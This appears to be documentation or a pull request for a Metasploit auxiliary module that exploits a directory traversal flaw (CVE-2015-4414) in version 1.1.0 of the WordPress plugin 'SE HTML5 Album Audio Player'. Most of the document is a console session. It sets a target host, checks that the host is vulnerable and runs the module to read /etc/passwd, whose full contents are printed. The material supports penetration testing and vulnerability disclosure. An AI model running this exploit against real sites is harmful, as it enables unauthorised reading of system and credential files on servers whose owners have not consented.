#### Add Wordpress Plugin SE HTML5 Album Audio Player File Read Vulnerability.

  Application: Wordpress Plugin "SE HTML5 Album Audio Player" 1.1.0
  Homepage: https://wordpress.org/plugins/se-html5-album-audio-player/
  Source Code: https://downloads.wordpress.org/plugin/se-html5-album-audio-player.1.1.0.zip
  Active Installs (wordpress.org): 400+
  
#### Vulnerable packages*
        
  1.1.0
  
#### Usage:

##### Linux (Ubuntu 12.04.5 LTS):
```
msf > use auxiliary/scanner/http/wp_se_html5_album_audioplayer_file_read 
msf auxiliary(wp_se_html5_album_audioplayer_file_read) > info

       Name: WordPress SE HTML5 Album Audio Player File Read Vulnerability
     Module: auxiliary/scanner/http/wp_se_html5_album_audioplayer_file_read
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Larry Cashdollar
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  DEPTH      6                yes       Traversal Depth (to reach the root folder)
  FILEPATH   /etc/passwd      yes       The path to the file to read
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port
  TARGETURI  /                yes       The base path to the wordpress application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host

Description:
  This module exploits a directory traversal vulnerability in 
  WordPress Plugin "SE HTML5 Album Audio PLayer", allowing to read 
  arbitrary files with the web server privileges.

References:
  https://wpvulndb.com/vulnerabilities/8032
  http://cvedetails.com/cve/2015-4414/
  http://www.vapid.dhs.org/advisory.php?v=124

msf auxiliary(wp_se_html5_album_audioplayer_file_read) > show options 

Module options (auxiliary/scanner/http/wp_se_html5_album_audioplayer_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads
   VHOST                       no        HTTP server virtual host

msf auxiliary(wp_se_html5_album_audioplayer_file_read) > set RHOSTS 192.168.1.37
RHOSTS => 192.168.1.37
msf auxiliary(wp_se_html5_album_audioplayer_file_read) > check
[*] 192.168.1.37:80 - The target appears to be vulnerable.
[*] Checked 1 of 1 hosts (100% complete)
msf auxiliary(wp_se_html5_album_audioplayer_file_read) > run

[+] 192.168.1.37:80 - File saved in: /home/espreto/.msf4/loot/20150608095741_default_192.168.1.37_sehtml5album_778604.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_se_html5_album_audioplayer_file_read) > set VERBOSE true
VERBOSE => true
msf auxiliary(wp_se_html5_album_audioplayer_file_read) > run

[*] Downloading file...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:105:114::/nonexistent:/bin/false
avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
saned:x:114:123::/home/saned:/bin/false
espreto:x:1000:1000:espreto,,,:/home/espreto:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
postgres:x:115:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:116:126:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin
logstash:x:998:998:LogStash Service User:/var/lib/logstash:/usr/sbin/nologin
elasticsearch:x:118:128::/usr/share/elasticsearch:/bin/false

[+] 192.168.1.37:80 - File saved in: /home/espreto/.msf4/loot/20150608095750_default_192.168.1.37_sehtml5album_775757.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_se_html5_album_audioplayer_file_read) > 

```
